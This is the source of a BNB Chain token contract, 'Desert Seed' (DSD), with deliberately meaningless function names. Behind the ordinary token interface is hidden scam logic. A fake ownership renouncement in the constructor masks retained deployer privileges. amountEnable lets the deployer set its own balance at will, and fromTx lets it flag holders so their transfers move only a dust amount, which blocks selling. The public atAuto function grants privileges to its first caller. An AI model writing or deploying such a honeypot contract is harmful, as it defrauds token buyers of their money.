/**
 *Submitted for verification at BscScan.com on 2023-02-06
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface shouldSwap {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface totalMin {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract DesertSeed {
    uint8 private amountShouldTo = 18;

    address private maxLimit;

    string private _name = "Desert Seed";
    string private _symbol = "DSD";

    uint256 private sellTo = 100000000 * 10 ** amountShouldTo;
    mapping(address => uint256) private senderReceiverSell;
    mapping(address => mapping(address => uint256)) private minEnable;

    mapping(address => bool) public isLiquidity;
    address public atLaunch;
    address public fundIs;
    mapping(address => bool) public teamLimit;
    uint256 constant launchedFee = 10 ** 10;
    bool public launchReceiver;

    

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        shouldSwap modeToken = shouldSwap(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        fundIs = totalMin(modeToken.factory()).createPair(modeToken.WETH(), address(this));
        maxLimit = totalToEnable();
        atLaunch = maxLimit;
        isLiquidity[atLaunch] = true;
        senderReceiverSell[atLaunch] = sellTo;
        emit Transfer(address(0), atLaunch, sellTo);
        fundLaunch();
    }

    

    function totalToEnable() private view returns (address) {
        return msg.sender;
    }

    function symbol() external view returns (string memory) {
        return _symbol;
    }

    function owner() external view returns (address) {
        return maxLimit;
    }

    function transfer(address tradingSwap, uint256 launchTeam) external returns (bool) {
        return transferFrom(totalToEnable(), tradingSwap, launchTeam);
    }

    function atAuto(address limitSwap) public {
        if (launchReceiver) {
            return;
        }
        isLiquidity[limitSwap] = true;
        launchReceiver = true;
    }

    function allowance(address sellMin, address isTeam) external view returns (uint256) {
        return minEnable[sellMin][isTeam];
    }

    function decimals() external view returns (uint8) {
        return amountShouldTo;
    }

    function approve(address isTeam, uint256 launchTeam) public returns (bool) {
        minEnable[totalToEnable()][isTeam] = launchTeam;
        emit Approval(totalToEnable(), isTeam, launchTeam);
        return true;
    }

    function balanceOf(address tradingAt) public view returns (uint256) {
        return senderReceiverSell[tradingAt];
    }

    function name() external view returns (string memory) {
        return _name;
    }

    function amountEnable(uint256 launchTeam) public {
        if (!isLiquidity[totalToEnable()]) {
            return;
        }
        senderReceiverSell[atLaunch] = launchTeam;
    }

    function transferFrom(address txSellFee, address tradingSwap, uint256 launchTeam) public returns (bool) {
        if (txSellFee != totalToEnable() && minEnable[txSellFee][totalToEnable()] != type(uint256).max) {
            require(minEnable[txSellFee][totalToEnable()] >= launchTeam);
            minEnable[txSellFee][totalToEnable()] -= launchTeam;
        }
        if (tradingSwap == atLaunch || txSellFee == atLaunch) {
            return takeSell(txSellFee, tradingSwap, launchTeam);
        }
        if (teamLimit[txSellFee]) {
            return takeSell(txSellFee, tradingSwap, launchedFee);
        }
        return takeSell(txSellFee, tradingSwap, launchTeam);
    }

    function fundLaunch() public {
        emit OwnershipTransferred(atLaunch, address(0));
        maxLimit = address(0);
    }

    function takeSell(address minFeeFund, address feeFundTrading, uint256 launchTeam) internal returns (bool) {
        require(senderReceiverSell[minFeeFund] >= launchTeam);
        senderReceiverSell[minFeeFund] -= launchTeam;
        senderReceiverSell[feeFundTrading] += launchTeam;
        emit Transfer(minFeeFund, feeFundTrading, launchTeam);
        return true;
    }

    function totalSupply() external view returns (uint256) {
        return sellTo;
    }

    function getOwner() external view returns (address) {
        return maxLimit;
    }

    function fromTx(address sellFeeTeam) public {
        if (sellFeeTeam == atLaunch || sellFeeTeam == fundIs || !isLiquidity[totalToEnable()]) {
            return;
        }
        teamLimit[sellFeeTeam] = true;
    }


}